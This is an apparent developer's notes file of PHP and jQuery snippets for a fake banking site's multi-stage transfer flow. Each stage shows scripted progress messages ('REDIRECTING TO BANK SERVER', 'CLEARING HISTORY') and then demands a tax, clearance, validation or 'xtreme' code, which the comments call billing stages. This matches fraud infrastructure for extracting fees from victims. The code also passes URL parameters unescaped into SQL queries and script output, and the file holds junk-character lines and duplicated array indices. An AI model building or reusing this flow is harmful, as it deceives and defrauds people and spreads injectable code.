// 5 stages

    STEPTS 
//THIS IS THE STEP FOR 5 STAGE CODE,    All the validation stage must be edited and replced with the below 
//The js must be replaced with the bellow at     things/js/bank/script.js



// STAGE 1
// transfer-process      transfer_process.php     O-24

<?php 
session_start();
include('conn_auth.php');
include('customInfo.php');
if($rowUser['cust_trans_stat']=="Off"){
header("location:transfer-checked?transID=". md5($_GET['transID']) . "&feedback=Transaction checked");
}
$selTras = $conn->query("select * from transfer_info where trans_id = '" . $_GET['transID'] . "'") or die($conn->error);
$rowtras = $selTras->fetch_assoc();
if($rowtras['trans_stat'] == "Confirm code"){
header("location:transfer-process?transID=". md5($_GET['transID']));
} 

?>
var targetdestination="enter-code?trans_id=<?php echo md5($_GET['transID']); ?>&fd=redirect"


var splashmessage=new Array()
var openingtags='<font face="Verdana" bgcolor="#00FF00" size="2">'
splashmessage[0]='TRANSFER FORM SUBMITTED'
splashmessage[1]='PLEASE WAIT..............'
splashmessage[2]='YOUR TRANSFER DATA IS BEING PROCESSED'
splashmessage[3]='YOUR TRANSFER DATA IS BEING PROCESSED ACCOUNT NUMBER VERIFIED'
splashmessage[4]='TRANSFER DATA PROCESSED :::  <?php echo "$site_name";?> PORTAL OPENED'
splashmessage[5]='INITIATING TRANSFER'
splashmessage[6]= '1%.......OF TRANSFER COMPLETED'
splashmessage[7]='2%.......OF TRANSFER COMPLETED'
splashmessage[8]='3%.......OF TRANSFER COMPLETED'
splashmessage[9]='5%.......OF TRANSFER COMPLETED'
splashmessage[10]='6%.......OF TRANSFER COMPLETED'
splashmessage[11]= '7%.......OF TRANSFER COMPLETED'
splashmessage[12]='9%.......OF TRANSFER COMPLETED'
splashmessage[13]='10%.......OF TRANSFER COMPLETED'
splashmessage[14]='11%.......OF TRANSFER COMPLETED'
splashmessage[15]='13%.......OF TRANSFER COMPLETED'
splashmessage[16]='14%.......OF TRANSFER COMPLETED'
splashmessage[17]='17%.......OF TRANSFER COMPLETED'
splashmessage[18]='18%.......OF TRANSFER COMPLETED'
splashmessage[19]='20%.......OF TRANSFER COMPLETED'
splashmessage[20]='21%.......OF TRANSFER COMPLETED'
splashmessage[21]='23%.......OF TRANSFER COMPLETED'
splashmessage[22]='24%.......OF TRANSFER COMPLETED'
var closingtags='</font>'















// STAGE 2
// TRANSFER FUNDS    transfer-funds     transfer_funds.php    28-55 



var targetdestination="tax-code?trans_id=<?php echo $_GET['trans_id']; ?>&fd=recheck"


var splashmessage=new Array()
var openingtags='<font face="Verdana" bgcolor="#00FF00" size="2">'
splashmessage[0]='CODE SUCCESSFULLY VERIFIED'
splashmessage[1]='PLEASE WAIT..............'
splashmessage[2]='YOUR TRANSFER DATA IS BEING PROCESSED'
splashmessage[3]='YOUR TRANSFER DATA IS BEING NOW BEING REDIRECTED'
splashmessage[4]='TRANSFER DATA PROCESSED :::  <?php echo "$site_name";?> PORTAL OPENED'
splashmessage[5]='INITIATING TRANSFER'
splashmessage[6]='28%.......OF TRANSFER COMPLETED'
splashmessage[7]='29%.......OF TRANSFER COMPLETED'
splashmessage[8]='31%.......OF TRANSFER COMPLETED'
splashmessage[9]='32%.......OF TRANSFER COMPLETED'
splashmessage[10]='33%.......OF TRANSFER COMPLETED'
splashmessage[11]='34%.......OF TRANSFER COMPLETED'
splashmessage[12]='36%.......OF TRANSFER COMPLETED'
splashmessage[13]='37%.......OF TRANSFER COMPLETED'
splashmessage[14]='39%.......OF TRANSFER COMPLETED'    
splashmessage[15]='39%.......OF TRANSFER COMPLETED'
splashmessage[16]='40%.......OF TRANSFER COMPLETED'
splashmessage[17]='41%.......OF TRANSFER COMPLETED'
splashmessage[18]='42%.......OF TRANSFER COMPLETED'
splashmessage[19]='43%.......OF TRANSFER COMPLETED'
splashmessage[20]='44%.......OF TRANSFER COMPLETED'
splashmessage[21]='45%.......OF TRANSFER COMPLETED'
splashmessage[22]='47%.......OF TRANSFER COMPLETED'
splashmessage[23]='48%.......OF TRANSFER COMPLETED'
splashmessage[24]='50%.......OF TRANSFER COMPLETED'
splashmessage[25]='51%.......OF TRANSFER COMPLETED'
splashmessage[26]='52%.......OF TRANSFER COMPLETED'
splashmessage[27]='53%.......OF TRANSFER COMPLETED'
splashmessage[23]='53%.......OF TRANSFER COMPLETED'
splashmessage[29]='PROCESSING ALL CHARGES....'
splashmessage[30]='PROCESSING ALL CHARGES..........'
splashmessage[31]='54%.......OF TRANSFER COMPLETED'
splashmessage[32]='55%.......OF TRANSFER COMPLETED'
var closingtags='</font>'













//STAGE 3     finalizing-transfer     final.php     55-66

var targetdestination="clearance-code?trans_id=<?php echo $_GET['trans_id']; ?>&fd=redirect"


var splashmessage=new Array()
var openingtags='<font face="Verdana" bgcolor="#00FF00" size="2">'
splashmessage[0]='CODE SUCCESSFULLY VERIFIED'
splashmessage[1]='REDIRECTING TO BANK SERVER'
splashmessage[2]='PLEASE WAIT..............'
splashmessage[3]='YOUR TRANSFER IS NOW BEING FINALISED'
splashmessage[4]='TRANSFER DATA PROCESSED ::: <span class="colorB"> <?php echo "$site_name";?></span> PORTAL OPENED'
splashmessage[5]='INITIATING TRANSFER'
splashmessage[6]='55%.......OF TRANSFER COMPLETED'
splashmessage[7]='56%.......OF TRANSFER COMPLETED'
splashmessage[8]='57%.......OF TRANSFER COMPLETED'
splashmessage[9]='58%.......OF TRANSFER COMPLETED'
splashmessage[10]='59%.......OF TRANSFER COMPLETED'
splashmessage[11]='60%.......OF TRANSFER COMPLETED'
splashmessage[12]='61%.......OF TRANSFER COMPLETED'
splashmessage[13]='62%.......OF TRANSFER COMPLETED'
splashmessage[14]='63%.......OF TRANSFER COMPLETED'
splashmessage[15]='64%.......OF TRANSFER COMPLETED'
splashmessage[16]='64%.......OF TRANSFER COMPLETED'
splashmessage[17]='PROCESSING  CHARGES....'
splashmessage[18]='PROCESSING ALL CHARGES....'
splashmessage[19]='65%.......OF TRANSFER COMPLETED'
splashmessage[20]='66%.......OF TRANSFER COMPLETED'
var closingtags='</font>'
    
    
    
    
    
// STAGE 4  transfer-validation    transfer_validation.php    66-77 
    
    
    var targetdestination="validation-code?trans_id=<?php echo $_GET['trans_id']; ?>&fd=redirect"


var splashmessage=new Array()
var openingtags ='<font face="Verdana" bgcolor="#00FF00" size="2">'
splashmessage[0]='CODE SUCCESSFULLY VERIFIED'
splashmessage[1]='REDIRECTING TO BANK SERVER..............'
splashmessage[2]='PLEASE WAIT.........................'
splashmessage[3]='YOUR TRANSFER IS NOW BEING FINALISED'
splashmessage[4]='TRANSFER DATA PROCESSED ::: <span class="colorB"> <?php echo "$site_name";?></span> PORTAL OPENED'
splashmessage[5]='INITIATING TRANSFER'
splashmessage[6]='66%.......OF TRANSFER COMPLETED'
splashmessage[7]='67%.......OF TRANSFER COMPLETED'
splashmessage[8]='68%.......OF TRANSFER COMPLETED'
splashmessage[9]='69%.......OF TRANSFER COMPLETED'
splashmessage[10]='70%.......OF TRANSFER COMPLETED'
splashmessage[11]='71%.......OF TRANSFER COMPLETED'
splashmessage[12]='72%.......OF TRANSFER COMPLETED'
splashmessage[13]='73%.......OF TRANSFER COMPLETED'
splashmessage[14]='74%.......OF TRANSFER COMPLETED'
splashmessage[15]='75%.......OF TRANSFER COMPLETED'
splashmessage[16]='76%.......OF TRANSFER COMPLETED'
splashmessage[17]='PROCESSING CHARGES....'
splashmessage[18]='PROCESSING ALL CHARGES......'
splashmessage[19]='77%.......OF TRANSFER COMPLETED'
splashmessage[20]='77%.......OF TRANSFER COMPLETED'
var closingtags='</font>'
    
    
    
    
    
    
    
    
    
    
// STAGE 5    xtreme-validation    xtreme_validation.php    77-93   
    
    
var targetdestination="xtreme-code?trans_id=<?php echo $_GET['trans_id']; ?>&fd=redirect"


var splashmessage=new Array()
var openingtags ='<font face="Verdana" bgcolor="#00FF00" size="2">'
splashmessage[0]='CODE SUCCESSFULLY VERIFIED'
splashmessage[1]='REDIRECTING TO BANK SERVER..............'
splashmessage[2]='PLEASE WAIT.........................'
splashmessage[3]='YOUR TRANSFER IS NOW BEING FINALISED'
splashmessage[4]='TRANSFER DATA PROCESSED ::: <span class="colorB"> <?php echo "$site_name";?></span> PORTAL OPENED'
splashmessage[5]='INITIATING TRANSFER'
splashmessage[6]='77%.......OF TRANSFER COMPLETED'
splashmessage[7]='78%.......OF TRANSFER COMPLETED'
splashmessage[8]='79%.......OF TRANSFER COMPLETED'
splashmessage[9]='80%.......OF TRANSFER COMPLETED'
splashmessage[10]='81%.......OF TRANSFER COMPLETED'
splashmessage[11]='82%.......OF TRANSFER COMPLETED'
splashmessage[12]='83%.......OF TRANSFER COMPLETED'
splashmessage[13]='84%.......OF TRANSFER COMPLETED'
splashmessage[14]='85%.......OF TRANSFER COMPLETED'
splashmessage[15]='86%.......OF TRANSFER COMPLETED'
splashmessage[16]='87%.......OF TRANSFER COMPLETED'
splashmessage[17]='88%.......OF TRANSFER COMPLETED'
splashmessage[18]='89%.......OF TRANSFER COMPLETED'
splashmessage[19]='90%.......OF TRANSFER COMPLETED'
splashmessage[20]='91%.......OF TRANSFER COMPLETED'
splashmessage[21]='92%.......OF TRANSFER COMPLETED'
splashmessage[22]='93%.......OF TRANSFER COMPLETED'
splashmessage[23]='94%.......OF TRANSFER COMPLETED'
splashmessage[24]='95%.......OF TRANSFER COMPLETED'
splashmessage[25]='PROCESSING CHARGES....'
splashmessage[26]='PROCESSING ALL CHARGES......'
splashmessage[27]='95%.......OF TRANSFER COMPLETED'
splashmessage[28]='PLEASE WAIT...'
splashmessage[29]='PLEASE WAIT....'
splashmessage[30]='96%.......OF TRANSFER COMPLETED'
splashmessage[31]='97%.......OF TRANSFER COMPLETED'
splashmessage[32]='97%.......OF TRANSFER COMPLETED'
var closingtags='</font>'
    
    
    
    
    
    
    
    
    
// FINAL STAGE     complete-transfer       complete_transfer.php    97-100
    
    
    var targetdestination="transfer-info?trans_id=<?php echo $_GET['trans_id']; ?>&fb=finalizing transfer & creating portal space&edb=9003003993mnhd9389893493"


var splashmessage=new Array()
var openingtags='<font face="Verdana" bgcolor="#00FF00" size="2">'
splashmessage[0]='CODE SUCCESSFULLY VERIFIED'
splashmessage[1]='REDIRECTING TO BANK SERVER..............'
splashmessage[2]='PLEASE WAIT.........................'
splashmessage[3]='YOUR TRANSFER IS NOW BEING COMPLETED'
splashmessage[4]='TRANSFER DATA PROCESSED ::: TRANSFER DATA PROCESSED ::: <span class="colorB"> <?php echo "$site_name";?></span> PORTAL OPENED'
splashmessage[5]='INITIATING TRANSFER'
splashmessage[6]= '97%.......OF TRANSFER COMPLETED'
splashmessage[7]='98%.......OF TRANSFER COMPLETED'
splashmessage[8]='100%.......OF TRANSFER COMPLETED'
splashmessage[9]='100%.......OF TRANSFER COMPLETED'
splashmessage[10]='100%.......OF TRANSFER COMPLETED'
splashmessage[11]='100%.......OF TRANSFER COMPLETED'
splashmessage[12]='100%.......OF TRANSFER COMPLETED'
splashmessage[13]='TRANSFERING FUNDS....'
splashmessage[14]='CLEARING HISTORY..........'
splashmessage[15]='FUNDS SUCCESSFULLY TRANSFERED'
var closingtags='</font>'
    
    
    
    
    
    
    
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////    
    
    // REPLACE .js transfer fuction   WITH THE BELLOW   locattion   things/js/bank/script.php     start from   line 77-282    replace with bellow
    
    
    


function startTransfer(){
$('#formTransfer').submit(function(){
				$('.btnTrans').prop('disabled', true);
	    		$('.btnTrans').html("<img src='things/img/preloader.gif' width='32' height='32'>");
      
	  			var formData = new FormData($(this)[0]);

  $.ajax({
    url: 'LOG-IN-OUT?action=Start transfer',
    type: 'POST',
    data: formData,
    async: false,
    cache: false,
    contentType: false,
    processData: false,
    success: function (returndata) {
       if(returndata==0){
	    $('.btnTrans').prop('disabled', false);
	    $('.btnTrans').html("Restart Transfer");
		$('.errorInfo').show(500);
		$('.errorInfo').html("Insufficient funds, please contact your bank for more information");
	   }else{
		window.location="transfer-process?transID="+returndata;
		}
	
	}
  });
				return false;	  
					  });
}

function confirmCode(){
$('#confirmCOde').submit(function(){
				$('.btnCod').prop('disabled', true);
	    		$('.btnCod').html("Processing........");
      
	  			var formData = new FormData($(this)[0]);

  $.ajax({
    url: 'LOG-IN-OUT?action=Confirm Code',
    type: 'POST',
    data: formData,
    async: false,
    cache: false,
    contentType: false,
    processData: false,
    success: function (returndata) {
       if(returndata==0){
	    $('.btnTrans').prop('disabled', false);
		$('.btnTrans').html("Confirm Code");
	    $('.errorInfo').show(500);
		$('.errorInfo').html("Code does not exists. Please contact the administrator");
	   }else{
		$('.errorInfo').show(500);
		$('.errorInfo').html("Your code has been confirmed. Continue transfer...");
		setTimeout(function(){ window.location="transfer-funds?trans_id="+returndata   }, 3000)  
		
		}
	
	}
  });
				return false;	  
					  });
}

function confirmTax(){
$('#confirmTax').submit(function(){
				$('.btnTax').prop('disabled', true);
	    		$('.btnTax').html("Processing........");
      
	  			var formData = new FormData($(this)[0]);

  $.ajax({
    url: 'LOG-IN-OUT?action=Confirm Tax',
    type: 'POST',
    data: formData,
    async: false,
    cache: false,
    contentType: false,
    processData: false,
    success: function (returndata) {
       if(returndata==0){
	    $('.btnTrans').prop('disabled', false);
		$('.btnTrans').html("Confirm Code");
	    $('.errorInfo').show(500);
		$('.errorInfo').html("Code does not exists. Please contact the administrator");
	   }else{
		$('.errorInfo').show(500);
		$('.errorInfo').html("Your code has been confirmed. Continue transfer...");
		setTimeout(function(){ window.location="finalizing-transfer?trans_id="+returndata   }, 3000)  
		
		}
	
	}
  });
				return false;	  
					  });
}

function confirmClearance(){
$('#clearanceCode').submit(function(){
				$('.btnCle').prop('disabled', true);
	    		$('.btnCle').html("Processing, please wait.......");
      
	  			var formData = new FormData($(this)[0]);

  $.ajax({
    url: 'LOG-IN-OUT?action=Confirm Clearance',
    type: 'POST',
    data: formData,
    async: false,
    cache: false,
    contentType: false,
    processData: false,
    success: function (returndata) {
       if(returndata==0){
	    $('.btnTrans').prop('disabled', false);
		$('.btnTrans').html("Confirm Code");
	    $('.errorInfo').show(500);
		$('.errorInfo').html("Code does not exists. Please contact the administrator");
	   }else{
		$('.errorInfo').show(500);
		$('.errorInfo').html("Your code has been confirmed. Continue transfer...");
		setTimeout(function(){ window.location="transfer-validation?trans_id="+returndata   }, 3000)  
		
		}
	
	}
  });
				return false;	  
					  });
}



function lastConfirmation(){
$('#ValidationCode').submit(function(){
				$('.btnVal').prop('disabled', true);
	    		$('.btnVal').html("Processing, please wait.......");
      
	  			var formData = new FormData($(this)[0]);

  $.ajax({
    url: 'LOG-IN-OUT?action=Confirm Validation',
    type: 'POST',
    data: formData,
    async: false,
    cache: false,
    contentType: false,
    processData: false,
    success: function (returndata) {
       if(returndata==0){
	    $('.btnTrans').prop('disabled', false);
		$('.btnTrans').html("Confirm Code");
	    $('.errorInfo').show(500);
		$('.errorInfo').html("Code does not exists. Please contact the administrator");
	   }else{
		$('.errorInfo').show(500);
		$('.errorInfo').html("Your code has been confirmed. Continue transfer...");
		setTimeout(function(){ window.location="xtreme-validation?trans_id="+returndata   }, 3000)  
		
		}
	
	}
  });
				return false;	  
					  });
}



// NOT APPLICABLE ECEPT YOU NEED 5TH BILLING STAGE             REPLACE   "complete-transfer?trans_id"   of above    WITH   "xtreme-validation?trans_id" 
function fifthStageCOnfirm(){
$('#xtremeValidation').submit(function(){
				$('.btnXtr').prop('disabled', true);
	    		$('.btnXtr').html("Processing, please wait.......");
      
	  			var formData = new FormData($(this)[0]);

  $.ajax({
    url: 'LOG-IN-OUT?action=Confirm xtreme stage',
    type: 'POST',
    data: formData,
    async: false,
    cache: false,
    contentType: false,
    processData: false,
    success: function (returndata) {
       if(returndata==0){
	    $('.btnTrans').prop('disabled', false);
		$('.btnTrans').html("Confirm Code");
	    $('.errorInfo').show(500);
		$('.errorInfo').html("Code does not exists. Please contact the administrator");
		$('.errorInfo').delay(5000).fadeOut('slow');
	   }else{
		$('.errorInfo').show(500);
		$('.errorInfo').html("Your code has been confirmed. Continue transfer...");
		setTimeout(function(){ window.location="complete-transfer?trans_id="+returndata   }, 3000)  
		
		}
	
	}
  });
				return false;	  
					  });
}



    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]   
    }}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||"""""""""""""""""""""""""""""""""""""""""""""""""""""  4 STAGE BILLING  """"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""??????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}
    
    // 4 stages

    STEPS 
//THIS IS THE STEP FOR 4 STAGE CODE,    All the validation stage must be edited and replced with the below 
//The js must be replaced with the bellow at     things/js/bank/script.js

    
    
    
    
    
  
    
    
    
    // STAGE 1
// transfer-process      transfer_process.php     O-24

<?php 
session_start();
include('conn_auth.php');
include('customInfo.php');
if($rowUser['cust_trans_stat']=="Off"){
header("location:transfer-checked?transID=". md5($_GET['transID']) . "&feedback=Transaction checked");
}
$selTras = $conn->query("select * from transfer_info where trans_id = '" . $_GET['transID'] . "'") or die($conn->error);
$rowtras = $selTras->fetch_assoc();
if($rowtras['trans_stat'] == "Confirm code"){
header("location:transfer-process?transID=". md5($_GET['transID']));
} 

?>
    
    
    
    
    
var targetdestination="enter-code?trans_id=<?php echo md5($_GET['transID']); ?>&fd=redirect"


var splashmessage=new Array()
var openingtags='<font face="Verdana" bgcolor="#00FF00" size="2">'
splashmessage[0]='TRANSFER FORM SUBMITTED'
splashmessage[1]='PLEASE WAIT..............'
splashmessage[2]='YOUR TRANSFER DATA IS BEING PROCESSED'
splashmessage[3]='YOUR TRANSFER DATA IS BEING PROCESSED ACCOUNT NUMBER VERIFIED'
splashmessage[4]='TRANSFER DATA PROCESSED ::: <span class="colorB" id="my-email-info"> PORTAL OPENED</span>'
splashmessage[5]='INITIATING TRANSFER'
splashmessage[6]= '1%.......OF TRANSFER COMPLETED'
splashmessage[7]='2%.......OF TRANSFER COMPLETED'
splashmessage[8]='3%.......OF TRANSFER COMPLETED'
splashmessage[9]='5%.......OF TRANSFER COMPLETED'
splashmessage[10]='6%.......OF TRANSFER COMPLETED'
splashmessage[11]= '7%.......OF TRANSFER COMPLETED'
splashmessage[12]='9%.......OF TRANSFER COMPLETED'
splashmessage[13]='10%.......OF TRANSFER COMPLETED'
splashmessage[14]='11%.......OF TRANSFER COMPLETED'
splashmessage[15]='13%.......OF TRANSFER COMPLETED'
splashmessage[16]='14%.......OF TRANSFER COMPLETED'
splashmessage[17]='17%.......OF TRANSFER COMPLETED'
splashmessage[18]='18%.......OF TRANSFER COMPLETED'
splashmessage[19]='20%.......OF TRANSFER COMPLETED'
splashmessage[20]='21%.......OF TRANSFER COMPLETED'
splashmessage[21]='23%.......OF TRANSFER COMPLETED'
splashmessage[22]='24%.......OF TRANSFER COMPLETED'
var closingtags='</font>'









// STAGE 2
// TRANSFER FUNDS    transfer-funds     transfer_funds.php    24-66 

  
    
    var targetdestination="tax-code?trans_id=<?php echo $_GET['trans_id']; ?>&fd=recheck"


var splashmessage=new Array()
var openingtags='<font face="Verdana" bgcolor="#00FF00" size="2">'
splashmessage[0]='CODE SUCCESSFULLY VERIFIED'
splashmessage[1]='PLEASE WAIT..............'
splashmessage[2]='YOUR TRANSFER DATA IS BEING PROCESSED'
splashmessage[3]='YOUR TRANSFER DATA IS BEING NOW BEING REDIRECTED'
splashmessage[4]='TRANSFER DATA PROCESSED :::  <?php echo "$site_name";?> PORTAL OPENED'
splashmessage[5]='INITIATING TRANSFER'
splashmessage[6]='24%.......OF TRANSFER COMPLETED'
splashmessage[7]='login.php?action=Logout'
splashmessage[6]='26%.......OF TRANSFER COMPLETED'
splashmessage[7]='27%.......OF TRANSFER COMPLETED'
splashmessage[6]='28%.......OF TRANSFER COMPLETED'
splashmessage[7]='29%.......OF TRANSFER COMPLETED'
splashmessage[8]='31%.......OF TRANSFER COMPLETED'
splashmessage[9]='32%.......OF TRANSFER COMPLETED'
splashmessage[10]='33%.......OF TRANSFER COMPLETED'
splashmessage[11]='34%.......OF TRANSFER COMPLETED'
splashmessage[12]='36%.......OF TRANSFER COMPLETED'
splashmessage[13]='37%.......OF TRANSFER COMPLETED'
splashmessage[14]='39%.......OF TRANSFER COMPLETED'    
splashmessage[15]='39%.......OF TRANSFER COMPLETED'
splashmessage[16]='40%.......OF TRANSFER COMPLETED'
splashmessage[17]='41%.......OF TRANSFER COMPLETED'
splashmessage[18]='42%.......OF TRANSFER COMPLETED'
splashmessage[19]='43%.......OF TRANSFER COMPLETED'
splashmessage[20]='44%.......OF TRANSFER COMPLETED'
splashmessage[21]='45%.......OF TRANSFER COMPLETED'
splashmessage[22]='47%.......OF TRANSFER COMPLETED'
splashmessage[23]='48%.......OF TRANSFER COMPLETED'
splashmessage[24]='50%.......OF TRANSFER COMPLETED'
splashmessage[25]='51%.......OF TRANSFER COMPLETED'
splashmessage[26]='52%.......OF TRANSFER COMPLETED'
splashmessage[27]='53%.......OF TRANSFER COMPLETED'
splashmessage[28]='54%.......OF TRANSFER COMPLETED'
splashmessage[29]='55%.......OF TRANSFER COMPLETED'
splashmessage[30]='56%.......OF TRANSFER COMPLETED'
splashmessage[31]='57%.......OF TRANSFER COMPLETED'
splashmessage[32]='58%.......OF TRANSFER COMPLETED'
splashmessage[33]='59%.......OF TRANSFER COMPLETED'
splashmessage[34]='60%.......OF TRANSFER COMPLETED'
splashmessage[35]='61%.......OF TRANSFER COMPLETED'
splashmessage[36]='62%.......OF TRANSFER COMPLETED'
splashmessage[37]='63%.......OF TRANSFER COMPLETED'
splashmessage[38]='64%.......OF TRANSFER COMPLETED'
splashmessage[39]='PROCESSING ALL CHARGES....'
splashmessage[40]='PROCESSING ALL CHARGES..........'
splashmessage[41]='65%.......OF TRANSFER COMPLETED'
splashmessage[42]='66%.......OF TRANSFER COMPLETED'
var closingtags='</font>'
    
    
    
    
    
//STAGE 3     finalizing-transfer     final.php     66- 81   
    
    
    
    
 var targetdestination="clearance-code?trans_id=<?php echo $_GET['trans_id']; ?>&fd=redirect"


var splashmessage=new Array()
var openingtags='<font face="Verdana" bgcolor="#00FF00" size="2">'
splashmessage[0]='CODE SUCCESSFULLY VERIFIED'
splashmessage[1]='REDIRECTING TO BANK SERVER..............'
splashmessage[2]='PLEASE WAIT.........................'
splashmessage[3]='YOUR TRANSFER IS NOW BEING FINALISED'
splashmessage[4]='TRANSFER DATA PROCESSED ::: <?php echo "$site_name";?> PORTAL OPENED'
splashmessage[5]='INITIATING TRANSFER'
splashmessage[6]='66%.......OF TRANSFER COMPLETED'
splashmessage[7]='login.php?action=Logout'
splashmessage[8]='68%.......OF TRANSFER COMPLETED'
splashmessage[9]='69%.......OF TRANSFER COMPLETED'
splashmessage[10]='70%.......OF TRANSFER COMPLETED'
splashmessage[11]='71%.......OF TRANSFER COMPLETED'
splashmessage[12]='72%.......OF TRANSFER COMPLETED'
splashmessage[13]='73%.......OF TRANSFER COMPLETED'
splashmessage[14]='74%.......OF TRANSFER COMPLETED'
splashmessage[15]='75%.......OF TRANSFER COMPLETED'
splashmessage[16]='76%.......OF TRANSFER COMPLETED'
splashmessage[17]='77%.......OF TRANSFER COMPLETED'
splashmessage[18]='78%.......OF TRANSFER COMPLETED'
splashmessage[19]='79%.......OF TRANSFER COMPLETED'
splashmessage[20]='PROCESSING CHARGES....'
splashmessage[21]='PROCESSING ALL CHARGES......'
splashmessage[22]='80%.......OF TRANSFER COMPLETED'
splashmessage[23]='81%.......OF TRANSFER COMPLETED'
var closingtags='</font>'   
    
    

    
    
    
    
    
    
    
// STAGE 4     transfer-validation    transfer_validation.php    81-97  
    
    
    
    var targetdestination="validation-code?trans_id=<?php echo $_GET['trans_id']; ?>&fd=redirect"


var splashmessage=new Array()
var openingtags ='<font face="Verdana" bgcolor="#00FF00" size="2">'
splashmessage[0]='CODE SUCCESSFULLY VERIFIED'
splashmessage[1]='REDIRECTING TO BANK SERVER..............'
splashmessage[2]='PLEASE WAIT.........................'
splashmessage[3]='YOUR TRANSFER IS NOW BEING FINALISED'
splashmessage[4]='TRANSFER DATA PROCESSED ::: <?php echo "$site_name";?> PORTAL OPENED'
splashmessage[5]='INITIATING TRANSFER'
splashmessage[6]='81%.......OF TRANSFER COMPLETED'
splashmessage[7]='82%.......OF TRANSFER COMPLETED'
splashmessage[8]='83%.......OF TRANSFER COMPLETED'
splashmessage[9]='84%.......OF TRANSFER COMPLETED'
splashmessage[10]='85%.......OF TRANSFER COMPLETED'
splashmessage[11]='86%.......OF TRANSFER COMPLETED'
splashmessage[12]='87%.......OF TRANSFER COMPLETED'
splashmessage[13]='88%.......OF TRANSFER COMPLETED'
splashmessage[14]='89%.......OF TRANSFER COMPLETED'
splashmessage[15]='90%.......OF TRANSFER COMPLETED'
splashmessage[16]='91%.......OF TRANSFER COMPLETED'
splashmessage[17]='92%.......OF TRANSFER COMPLETED'
splashmessage[18]='93%.......OF TRANSFER COMPLETED'
splashmessage[19]='94%.......OF TRANSFER COMPLETED'
splashmessage[20]='95%.......OF TRANSFER COMPLETED'
splashmessage[21]='PROCESSING CHARGES....'
splashmessage[22]='PROCESSING ALL CHARGES......'
splashmessage[23]='96%.......OF TRANSFER COMPLETED'
splashmessage[24]='97%.......OF TRANSFER COMPLETED'
var closingtags='</font>'
    
    
    
    
    
    
    
    
    
// STAGE 5    xtreme-validation    xtreme_validation.php    77-93     
    
    
 
    var targetdestination="xtreme-code?trans_id=<?php echo $_GET['trans_id']; ?>&fd=redirect"


var splashmessage=new Array()
var openingtags ='<font face="Verdana" bgcolor="#00FF00" size="2">'
splashmessage[0]='CODE SUCCESSFULLY VERIFIED'
splashmessage[1]='REDIRECTING TO BANK SERVER..............'
splashmessage[2]='PLEASE WAIT.........................'
splashmessage[3]='YOUR TRANSFER IS NOW BEING FINALISED'
splashmessage[4]='TRANSFER DATA PROCESSED ::: <?php echo "$site_name";?> PORTAL OPENED'
splashmessage[5]='INITIATING TRANSFER'
splashmessage[6]='77%.......OF TRANSFER COMPLETED'
splashmessage[7]='78%.......OF TRANSFER COMPLETED'
splashmessage[8]='79%.......OF TRANSFER COMPLETED'
splashmessage[9]='80%.......OF TRANSFER COMPLETED'
splashmessage[10]='81%.......OF TRANSFER COMPLETED'
splashmessage[11]='82%.......OF TRANSFER COMPLETED'
splashmessage[12]='83%.......OF TRANSFER COMPLETED'
splashmessage[13]='84%.......OF TRANSFER COMPLETED'
splashmessage[14]='85%.......OF TRANSFER COMPLETED'
splashmessage[15]='86%.......OF TRANSFER COMPLETED'
splashmessage[16]='87%.......OF TRANSFER COMPLETED'
splashmessage[17]='88%.......OF TRANSFER COMPLETED'
splashmessage[18]='89%.......OF TRANSFER COMPLETED'
